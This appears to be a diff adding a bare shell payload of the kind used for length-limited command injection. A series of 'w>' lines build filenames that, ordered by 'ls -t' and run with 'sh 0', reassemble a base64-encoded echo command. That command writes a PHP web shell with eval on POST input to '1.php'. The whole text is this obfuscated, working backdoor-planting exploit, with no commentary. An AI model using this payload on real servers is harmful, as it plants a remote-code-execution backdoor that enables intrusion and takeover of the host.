@@ -1,0 +1,25 @@
+   w>hp
+   w>1.p\\
+   w>d\>\\
+   w>\ -\\
+   w>e64\\
+   w>bas\\
+   w>=\|\\
+   w>/Pg=\\
+   w>KTs\\
+   w>ydd\\
+   w>FuZ\\
+   w>MMW\\
+   w>Wyd\\
+   w>1NU\\
+   w>9QT\\
+   w>oJF\\
+   w>YWw\\
+   w>GV2\\
+   w>AgQ\\
+   w>waH\\
+   w>PD9\\
+   w>o\ \\
+   w>ech\\
+   ls -t>0
+   sh 0
